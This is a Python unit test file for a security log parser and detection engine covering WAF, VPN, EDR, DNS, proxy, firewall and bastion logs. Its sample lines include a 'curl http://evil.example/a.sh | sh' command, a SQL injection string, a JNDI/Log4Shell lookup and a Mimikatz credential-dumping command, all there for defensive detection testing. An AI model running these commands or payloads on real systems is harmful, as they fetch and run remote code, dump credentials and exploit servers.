from _support import *


class P0SecurityRegressionTests(unittest.TestCase):
    def test_p0_waf_csv_detects_web_attack(self):
        content = (
            "time,src_ip,host,method,uri,action,rule_id,attack_type,status,user_agent\n"
            "2024-03-15 10:00:00,203.0.113.8,www.example.com,GET,"
            "\"/login?id=1 UNION SELECT NULL--\",block,942100,SQL Injection,403,sqlmap\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "waf.csv", parser_hint="csv")

        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.category, "Web攻击")
        self.assertEqual(event.rule_name, "SQL注入")
        self.assertIn("web-attack", event.tags)
        self.assertIn("waf", event.tags)

    def test_p0_waf_vendor_request_fields_preserve_sqli_and_source_ip(self):
        line = (
            'time=2024-03-15T10:50:00 log_type=waf src_addr=203.0.113.8 '
            'host=www.example.com method=GET '
            'request_uri="/login?id=1 UNION SELECT NULL--" policy_action=block '
            'attack_name="SQL Injection" status=403'
        )

        result = parse_p0_security_lines([line], "waf.log")

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.rule_name, "SQL注入")
        self.assertEqual(event.ip, "203.0.113.8")
        self.assertIn("web-attack", event.tags)
        self.assertIn("blocked", event.tags)
        self.assertIn("UNION SELECT", event.message)
        self.assertEqual(event.details.get("srcaddr"), "203.0.113.8")
        self.assertEqual(event.details.get("attackname"), "SQL Injection")

    def test_p0_vpn_jsonl_feeds_brute_force_detection(self):
        lines = [
            _json.dumps({
                "log_type": "vpn",
                "time": f"2024-03-15 10:00:{i:02d}",
                "user": "alice",
                "src_ip": "8.8.4.4",
                "result": "failed",
                "reason": "bad password",
            })
            for i in range(5)
        ]

        result = parse_p0_security_lines(lines, "vpn.jsonl")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 5)
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_p0_vpn_vendor_auth_result_fields_feed_brute_force_detection(self):
        lines = [
            (
                f"time=2024-03-15T11:10:{i:02d} log_type=vpn "
                "username=alice src_ip=198.51.100.44 auth_result=failed "
                "auth_method=password gateway=vpn-gw failure_reason=bad_password"
            )
            for i in range(5)
        ]

        result = parse_p0_security_lines(lines, "vpn.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 5)
        self.assertTrue(all(event.rule_name == "VPN 登录失败" for event in result.events))
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertTrue(all(event.user == "alice" for event in result.events))
        self.assertTrue(all(event.ip == "198.51.100.44" for event in result.events))
        self.assertEqual(result.events[0].details.get("authresult"), "failed")
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_p0_bastion_key_value_detects_risky_command(self):
        line = (
            'time="2024-03-15 10:01:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 '
            'command="curl http://evil.example/a.sh | sh" result=success'
        )

        result = parse_p0_security_lines([line], "bastion.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "堡垒机高危命令")
        self.assertIn("bastion-command", result.events[0].tags)
        self.assertEqual(result.events[0].host, "10.0.0.5")

    def test_p0_bastion_file_transfer_without_command_is_detected(self):
        line = (
            'time="2024-03-15 10:11:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 operation=file_upload '
            'file_path="/tmp/db.sql" result=success'
        )

        result = parse_p0_security_lines([line], "bastion.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.rule_name, "堡垒机文件传输")
        self.assertEqual(event.mitre_attack, "T1105")
        self.assertIn("bastion-command", event.tags)
        self.assertIn("file-transfer", event.tags)
        self.assertEqual(event.host, "10.0.0.5")
        self.assertEqual(event.details.get("filepath"), "/tmp/db.sql")
        self.assertTrue(any(alert.rule_id == "P0-BASTION-001" for alert in summary.alerts))

    def test_p0_bastion_vendor_operation_type_file_transfer_is_detected(self):
        line = (
            'time="2024-03-15 11:20:00" type=bastion operator=admin '
            'source_ip=1.1.1.1 target_asset=10.0.0.5 '
            'operation_type=file_download file_name="/tmp/db.sql" result=success'
        )

        result = parse_p0_security_lines([line], "bastion.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.rule_name, "堡垒机文件传输")
        self.assertEqual(event.host, "10.0.0.5")
        self.assertEqual(event.user, "admin")
        self.assertIn("file-transfer", event.tags)
        self.assertEqual(event.details.get("operationtype"), "file_download")
        self.assertEqual(event.details.get("targetasset"), "10.0.0.5")
        self.assertTrue(any(alert.rule_id == "P0-BASTION-001" for alert in summary.alerts))

    def test_p0_dns_key_value_detects_tunnel_like_query(self):
        line = (
            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR"
        )

        result = parse_p0_security_lines([line], "dns.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "DNS 隧道/高熵域名")
        self.assertIn("dns-tunnel", result.events[0].tags)

    def test_p0_dns_vendor_category_fields_promote_c2_alert(self):
        line = (
            "time=2024-03-15T10:40:00 log_type=dns client_ip=10.0.0.8 "
            "query=beacon.evil.example threat_category=C2 rcode=NOERROR "
            "answer=203.0.113.9"
        )

        result = parse_p0_security_lines([line], "dns.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.rule_name, "DNS 恶意域名/威胁分类")
        self.assertIn("dns", event.tags)
        self.assertIn("c2", event.tags)
        self.assertEqual(event.ip, "10.0.0.8")
        self.assertEqual(event.details.get("threatcategory"), "C2")
        self.assertTrue(any(alert.rule_id == "P0-C2-001" for alert in summary.alerts))

    def test_p0_firewall_csv_detects_allowed_sensitive_port(self):
        content = (
            "time,src_ip,dst_ip,dst_port,action,protocol\n"
            "2024-03-15 10:03:00,203.0.113.9,10.0.0.9,3389,allow,tcp\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "firewall.csv", parser_hint="csv")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "防火墙放行敏感端口访问")
        self.assertIn("firewall", result.events[0].tags)
        self.assertEqual(result.events[0].port, 3389)

    def test_p0_firewall_missing_action_is_not_reported_as_allowed(self):
        line = "time=2024-03-15T10:03:00 log_type=firewall src_ip=203.0.113.9 dst_ip=10.0.0.9 dst_port=3389"

        result = parse_p0_security_lines([line], "firewall.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "防火墙敏感端口访问（动作未知）")
        self.assertEqual(result.events[0].level, ThreatLevel.MEDIUM)
        self.assertNotIn("exposed-service", result.events[0].tags)
        self.assertIn("unknown-action", result.events[0].tags)

    def test_p0_firewall_vendor_policy_action_fields_promote_exposed_service(self):
        line = (
            "time=2024-03-15T11:00:00 log_type=firewall "
            "src_ip=203.0.113.9 dst_ip=10.0.0.9 dst_port=3389 "
            "policy_action=allow protocol=tcp"
        )

        result = parse_p0_security_lines([line], "firewall.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.rule_name, "防火墙放行敏感端口访问")
        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertIn("exposed-service", event.tags)
        self.assertEqual(event.details.get("action"), "allow")
        self.assertTrue(any(alert.rule_id == "P0-FW-001" for alert in summary.alerts))

    def test_p0_proxy_and_firewall_accept_common_bytes_out_aliases(self):
        lines = [
            "time=2024-03-15T10:06:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://upload.example/api request_bytes=209715200 action=allow",
            "time=2024-03-15T10:07:00 log_type=firewall src_ip=10.0.0.8 dst_ip=203.0.113.20 "
            "dst_port=443 action=allow protocol=tcp bytes_sent=209715200",
        ]

        result = parse_p0_security_lines(lines, "p0.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 2)
        self.assertEqual({event.rule_name for event in result.events}, {"代理大流量外发", "防火墙大流量外联"})
        self.assertTrue(all("exfiltration" in event.tags for event in result.events))
        self.assertEqual({event.details.get("bytes_out") for event in result.events}, {"209715200"})
        self.assertTrue(any(alert.rule_id == "P0-EXFIL-001" for alert in summary.alerts))

    def test_p0_generic_bytes_respects_traffic_direction(self):
        lines = [
            "time=2024-03-15T10:06:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://upload.example/api direction=outbound bytes=209715200 action=allow",
            "time=2024-03-15T10:07:00 log_type=firewall src_ip=10.0.0.8 dst_ip=203.0.113.20 "
            "dst_port=443 direction=egress action=allow protocol=tcp bytes=209715200",
            "time=2024-03-15T10:08:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://cdn.example/file.iso direction=inbound bytes=209715200 action=allow",
            "time=2024-03-15T10:09:00 log_type=firewall src_ip=203.0.113.20 dst_ip=10.0.0.8 "
            "dst_port=443 direction=ingress action=allow protocol=tcp bytes=209715200",
            "time=2024-03-15T10:10:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://cdn.example/file.iso response_bytes=209715200 action=allow",
        ]

        result = parse_p0_security_lines(lines, "p0.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 2)
        self.assertEqual({event.rule_name for event in result.events}, {"代理大流量外发", "防火墙大流量外联"})
        self.assertEqual({event.details.get("direction") for event in result.events}, {"outbound", "egress"})
        self.assertEqual({event.details.get("bytes_out") for event in result.events}, {"209715200"})
        self.assertTrue(any(alert.rule_id == "P0-EXFIL-001" for alert in summary.alerts))

    def test_p0_proxy_csv_accepts_client_to_server_bytes_only(self):
        content = (
            "time,log_type,src_ip,user,url,cs-bytes,sc-bytes,action\n"
            "2024-03-15T10:06:00,proxy,10.0.0.8,alice,https://upload.example/api,209715200,1024,allow\n"
            "2024-03-15T10:07:00,proxy,10.0.0.8,alice,https://cdn.example/file.iso,1024,209715200,allow\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "proxy.csv", parser_hint="csv")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.rule_name, "代理大流量外发")
        self.assertEqual(event.details.get("bytes_out"), "209715200")
        self.assertEqual(event.details.get("csbytes"), "209715200")
        self.assertEqual(event.details.get("scbytes"), "1024")
        self.assertTrue(any(alert.rule_id == "P0-EXFIL-001" for alert in summary.alerts))

    def test_p0_proxy_vendor_category_fields_promote_c2_alert(self):
        line = (
            "time=2024-03-15T10:20:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://beacon.evil.example/a url_category=Malware "
            "threat_category=C2 action=allowed"
        )

        result = parse_p0_security_lines([line], "proxy.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.rule_name, "代理命中恶意分类")
        self.assertIn("c2", event.tags)
        self.assertIn("malicious-url", event.tags)
        self.assertEqual(event.host, "beacon.evil.example")
        self.assertEqual(event.details.get("urlcategory"), "Malware")
        self.assertEqual(event.details.get("threatcategory"), "C2")
        self.assertTrue(any(alert.rule_id == "P0-C2-001" for alert in summary.alerts))

    def test_p0_proxy_vendor_request_url_fields_preserve_target_and_download_detection(self):
        lines = [
            "time=2024-03-15T12:00:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "request_url=https://download.evil.example/tool.ps1 action=allow",
            "time=2024-03-15T12:01:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "request_url=https://beacon.evil.example/a url_category=Malware "
            "threat_category=C2 action=allow",
        ]

        result = parse_p0_security_lines(lines, "proxy.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 2)
        by_name = {event.rule_name: event for event in result.events}
        download = by_name["代理下载可执行/脚本文件"]
        c2 = by_name["代理命中恶意分类"]
        self.assertEqual(download.host, "download.evil.example")
        self.assertIn("suspicious-download", download.tags)
        self.assertEqual(download.details.get("url"), "https://download.evil.example/tool.ps1")
        self.assertEqual(c2.host, "beacon.evil.example")
        self.assertIn("c2", c2.tags)
        self.assertEqual(c2.details.get("requesturl"), "https://beacon.evil.example/a")
        self.assertTrue(any(alert.rule_id == "P0-C2-001" for alert in summary.alerts))

    def test_p0_inbound_direction_vetoes_explicit_bytes_out_aliases(self):
        lines = [
            "time=2024-03-15T10:06:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://cdn.example/file.iso direction=inbound bytes_sent=209715200 action=allow",
            "time=2024-03-15T10:07:00 log_type=firewall src_ip=203.0.113.20 dst_ip=10.0.0.8 "
            "dst_port=443 direction=ingress action=allow protocol=tcp upload_bytes=209715200",
        ]

        result = parse_p0_security_lines(lines, "p0.log")
        summary = run_detection(result.events)

        self.assertEqual(result.events, [])
        self.assertFalse(any(alert.rule_id == "P0-EXFIL-001" for alert in summary.alerts))

    def test_p0_outbound_originator_bytes_do_not_count_response_bytes(self):
        lines = [
            "time=2024-03-15T10:06:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://upload.example/api direction=outbound orig_bytes=209715200 resp_bytes=1024 action=allow",
            "time=2024-03-15T10:07:00 log_type=firewall src_ip=10.0.0.8 dst_ip=203.0.113.20 "
            "dst_port=443 direction=egress action=allow protocol=tcp orig_bytes=209715200 resp_bytes=1024",
            "time=2024-03-15T10:08:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://cdn.example/file.iso direction=outbound resp_bytes=209715200 action=allow",
            "time=2024-03-15T10:09:00 log_type=firewall src_ip=203.0.113.20 dst_ip=10.0.0.8 "
            "dst_port=443 direction=ingress action=allow protocol=tcp orig_bytes=209715200",
        ]

        result = parse_p0_security_lines(lines, "p0.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 2)
        self.assertEqual({event.rule_name for event in result.events}, {"代理大流量外发", "防火墙大流量外联"})
        self.assertEqual({event.details.get("direction") for event in result.events}, {"outbound", "egress"})
        self.assertEqual({event.details.get("bytes_out") for event in result.events}, {"209715200"})
        self.assertTrue(all(event.details.get("origbytes") == "209715200" for event in result.events))
        self.assertTrue(any(alert.rule_id == "P0-EXFIL-001" for alert in summary.alerts))

    def test_p0_proxy_request_body_bytes_do_not_count_response_body_bytes(self):
        lines = [
            "time=2024-03-15T10:06:00 log_type=proxy src_ip=10.0.0.8 user=alice "
            "url=https://upload.example/api request_body_bytes=209715200 action=allow",
            "time=2024-03-15T10:07:00 log_type=proxy src_ip=10.0.0.9 user=bob "
            "url=https://upload.example/api req_body_bytes=209715200 action=allow",
            "time=2024-03-15T10:08:00 log_type=proxy src_ip=10.0.0.10 user=carol "
            "url=https://cdn.example/file.iso body_bytes_sent=209715200 action=allow",
            "time=2024-03-15T10:09:00 log_type=proxy src_ip=10.0.0.11 user=dave "
            "url=https://cdn.example/file.iso response_body_bytes=209715200 action=allow",
        ]

        result = parse_p0_security_lines(lines, "proxy.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 2)
        self.assertEqual({event.user for event in result.events}, {"alice", "bob"})
        self.assertTrue(all(event.rule_name == "代理大流量外发" for event in result.events))
        self.assertEqual({event.details.get("bytes_out") for event in result.events}, {"209715200"})
        self.assertTrue(any(alert.rule_id == "P0-EXFIL-001" for alert in summary.alerts))

    def test_p0_vpn_ambiguous_auth_event_is_not_successful_login(self):
        line = _json.dumps({
            "log_type": "vpn",
            "time": "2024-03-15 10:00:00",
            "user": "alice",
            "src_ip": "198.51.100.44",
            "event": "mfa challenge",
            "message": "用户登录进入 MFA 验证",
        })

        result = parse_p0_security_lines([line], "vpn.jsonl")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "VPN 认证事件")
        self.assertIn("auth-observed", result.events[0].tags)
        self.assertNotIn("successful-login", result.events[0].tags)

    def test_p0_pretty_json_object_and_jsonl_both_parse(self):
        pretty = _json.dumps({
            "log_type": "edr",
            "time": "2024-03-15 10:04:00",
            "host": "win-01",
            "severity": "critical",
            "alert": "Mimikatz credential dumping",
        }, ensure_ascii=False, indent=2)
        jsonl = "\n".join([
            _json.dumps({"log_type": "vpn", "time": "2024-03-15 10:00:00", "user": "alice", "src_ip": "198.51.100.44", "result": "failed"}),
            _json.dumps({"log_type": "vpn", "time": "2024-03-15 10:00:01", "user": "alice", "src_ip": "198.51.100.44", "result": "failed"}),
        ])

        pretty_result = parse_content(pretty, "edr.json", parser_name="p0-security")
        jsonl_result = parse_content(jsonl, "vpn.jsonl", parser_name="p0-security")

        self.assertEqual(len(pretty_result.events), 1)
        self.assertEqual(pretty_result.events[0].source, "EDR/XDR")
        self.assertEqual(len(jsonl_result.events), 2)
        self.assertTrue(all("failed-login" in event.tags for event in jsonl_result.events))

    def test_p0_invalid_json_records_parse_error(self):
        result = parse_p0_security_json("{not-json", "bad.json")

        self.assertEqual(result.events, [])
        self.assertEqual(result.stats.parse_errors, 1)

    def test_p0_edr_json_detects_credential_dumping(self):
        content = _json.dumps([{
            "log_type": "edr",
            "time": "2024-03-15 10:04:00",
            "host": "win-01",
            "user": "bob",
            "severity": "critical",
            "alert": "Mimikatz credential dumping",
            "process": "mimikatz.exe",
            "commandline": "sekurlsa::logonpasswords",
        }])

        result = parse_p0_security_json(content, "edr.json")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].level, ThreatLevel.CRITICAL)
        self.assertIn("malware-indicator", result.events[0].tags)
        self.assertIn("lsass-dump", result.events[0].tags)

    def test_p0_edr_vendor_detection_fields_detect_credential_dumping(self):
        content = _json.dumps([{
            "log_type": "edr",
            "time": "2024-03-15 10:30:00",
            "endpoint": "win-02",
            "user": "bob",
            "detection_name": "Mimikatz credential dumping",
            "process_name": "mimikatz.exe",
            "technique_id": "T1003.001",
        }])

        result = parse_p0_security_json(content, "edr.json")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.rule_name, "Mimikatz credential dumping")
        self.assertEqual(event.process, "mimikatz.exe")
        self.assertEqual(event.mitre_attack, "T1003.001")
        self.assertEqual(event.level, ThreatLevel.CRITICAL)
        self.assertIn("malware-indicator", event.tags)
        self.assertIn("lsass-dump", event.tags)
        self.assertTrue(any(alert.rule_id == "P0-EDR-001" for alert in summary.alerts))
        self.assertTrue(any(alert.rule_id == "CRED-001" for alert in summary.alerts))

    def test_p0_json_array_file_streams_records(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "vpn.json"
            path.write_text(
                _json.dumps([
                    {
                        "log_type": "vpn",
                        "time": "2024-03-15 10:00:00",
                        "user": "alice",
                        "src_ip": "198.51.100.44",
                        "result": "failed",
                    },
                    {
                        "log_type": "vpn",
                        "time": "2024-03-15 10:00:01",
                        "user": "alice",
                        "src_ip": "198.51.100.44",
                        "result": "failed",
                    },
                ]),
                encoding="utf-8",
            )
            result = parse_p0_security_json_file(str(path), path.name)

        self.assertEqual(len(result.events), 2)
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertGreater(result.file_size_bytes, 0)

    def test_p0_json_wrapper_records_file_is_supported(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "edr.json"
            path.write_text(
                _json.dumps({
                    "records": [{
                        "log_type": "edr",
                        "time": "2024-03-15 10:04:00",
                        "host": "win-01",
                        "severity": "critical",
                        "alert": "Mimikatz credential dumping",
                    }]
                }),
                encoding="utf-8",
            )
            result = parse_p0_security_json_file(str(path), path.name)

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].source, "EDR/XDR")
        self.assertIn("lsass-dump", result.events[0].tags)

    def test_p0_json_file_keeps_partial_events_and_counts_decode_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "vpn.json"
            path.write_text(
                '['
                '{"log_type":"vpn","time":"2024-03-15 10:00:00","user":"alice","src_ip":"198.51.100.44","result":"failed"},'
                '{"log_type":"vpn","time":"2024-03-15 10:00:01","user":"alice","src_ip":'
                ,
                encoding="utf-8",
            )
            result = parse_p0_security_json_file(str(path), path.name)

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.stats.parse_errors, 1)
        self.assertIn("failed-login", result.events[0].tags)

    def test_p0_adapter_registry_exposes_expected_kinds(self):
        self.assertEqual(
            list_p0_adapter_kinds(),
            ["waf", "vpn", "edr", "dns", "proxy", "firewall", "bastion", "app"],
        )

    def test_auto_parse_p0_application_log_detects_exploit_trace(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "application.log"
            path.write_text(
                "2024-03-15 10:05:00 ERROR request failed: ${jndi:ldap://evil.example/a}\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
        self.assertEqual(len(result.events), 1)
        self.assertIn("web-attack", result.events[0].tags)

    def test_p0_application_auth_event_field_feeds_brute_force_detection(self):
        lines = [
            f"time=2024-03-15T10:12:{i:02d} log_type=app service=portal "
            "event=login_failed user=alice src_ip=203.0.113.50 reason=bad_password"
            for i in range(5)
        ]

        result = parse_p0_security_lines(lines, "app.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 5)
        self.assertTrue(all(event.rule_name == "应用登录失败" for event in result.events))
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertTrue(all("application" in event.tags for event in result.events))
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_p0_application_vendor_auth_result_fields_feed_brute_force_detection(self):
        lines = [
            (
                f"time=2024-03-15T11:30:{i:02d} log_type=app "
                "service_name=portal event_type=login user_name=alice "
                "client_ip=203.0.113.50 auth_result=failed "
                "failure_reason=bad_password"
            )
            for i in range(5)
        ]

        result = parse_p0_security_lines(lines, "app.log")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 5)
        self.assertTrue(all(event.rule_name == "应用登录失败" for event in result.events))
        self.assertTrue(all(event.host == "portal" for event in result.events))
        self.assertTrue(all(event.user == "alice" for event in result.events))
        self.assertTrue(all(event.ip == "203.0.113.50" for event in result.events))
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertEqual(result.events[0].details.get("authresult"), "failed")
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_p0_security_events_are_promoted_to_alerts(self):
        lines = [
            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR",
            'time="2024-03-15 10:03:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 command="curl http://evil.example/a.sh | sh"',
            "time=2024-03-15T10:04:00 log_type=firewall src_ip=203.0.113.9 "
            "dst_ip=10.0.0.9 dst_port=3389 action=allow protocol=tcp",
        ]

        result = parse_p0_security_lines(lines, "p0.log")
        summary = run_detection(result.events)
        rule_ids = {alert.rule_id for alert in summary.alerts}

        self.assertIn("P0-C2-001", rule_ids)
        self.assertIn("P0-BASTION-001", rule_ids)
        self.assertIn("P0-FW-001", rule_ids)

    def test_p0_events_expose_stable_normalized_fields(self):
        """P0 解析结果必须暴露统一字段，方便后续 enrich/correlation/report 使用。"""
        path = Path(__file__).parent / "fixtures" / "p0" / "hvv_chain.jsonl"
        result = parse_p0_security_lines(path.read_text(encoding="utf-8").splitlines(), path.name)
        fields = (
            "source_type", "src_ip", "dst_ip", "asset", "account", "action",
            "status", "url", "command", "process", "bytes_out", "session_id", "trace_id",
        )

        self.assertEqual(len(result.events), 6)
        for event in result.events:
            for field in fields:
                self.assertIn(field, event.details)

        summary = run_detection(result.events, profile="cn-hvv")
        enriched = summary.timeline[0]
        self.assertIsNotNone(enriched)
        self.assertTrue(all("event_family" in event.details for event in result.events))
        self.assertTrue(all("asset_role" in event.details for event in result.events))

    def test_p0_hvv_chain_matches_golden_incident(self):
        """同一批 P0 样本的告警与 incident 结果必须稳定。"""
        reset_counter()
        base = Path(__file__).parent / "fixtures" / "p0"
        golden = _json.loads((base / "golden_hvv_chain.json").read_text(encoding="utf-8"))
        result = auto_parse(str(base / "hvv_chain.jsonl"))
        summary = run_detection(result.events, profile=golden["profile"])

        self.assertEqual(summary.total_events, golden["total_events"])
        self.assertEqual(sorted({alert.rule_id for alert in summary.alerts}), golden["alert_rule_ids"])
        self.assertEqual(len(summary.incidents), golden["incident_count"])
        top = summary.incidents[0]
        self.assertEqual(top.level.value, golden["top_incident"]["level"])
        self.assertEqual(top.confidence, golden["top_incident"]["confidence"])
        self.assertEqual(top.source_types, golden["top_incident"]["source_types"])
        self.assertEqual(top.attack_phases, golden["top_incident"]["attack_phases"])
        self.assertGreaterEqual(len(top.timeline), 4)
        self.assertTrue(top.next_logs)
        chain = {item.phase: item for item in summary.attack_chain}
        self.assertEqual(chain["初始访问"].event_count, 2)
        self.assertEqual(chain["主机失陷"].event_count, 1)
        self.assertEqual(chain["命令控制"].event_count, 2)
        self.assertEqual(chain["数据外传"].event_count, 1)
        self.assertNotIn("执行", chain)
        edr_alert = next(alert for alert in summary.alerts if alert.rule_id == "P0-EDR-001")
        self.assertEqual(edr_alert.mitre_attack, "T1505.003")
        self.assertEqual(edr_alert.mitre_phase, "主机失陷")

    def test_p0_benign_noise_does_not_create_high_risk_incident(self):
        """健康检查、正常堡垒机命令、少量 VPN 输错密码不应升级为案件。"""
        path = Path(__file__).parent / "fixtures" / "p0" / "benign_noise.jsonl"
        result = auto_parse(str(path))
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertEqual(len(summary.alerts), 0)
        self.assertEqual(len(summary.incidents), 0)
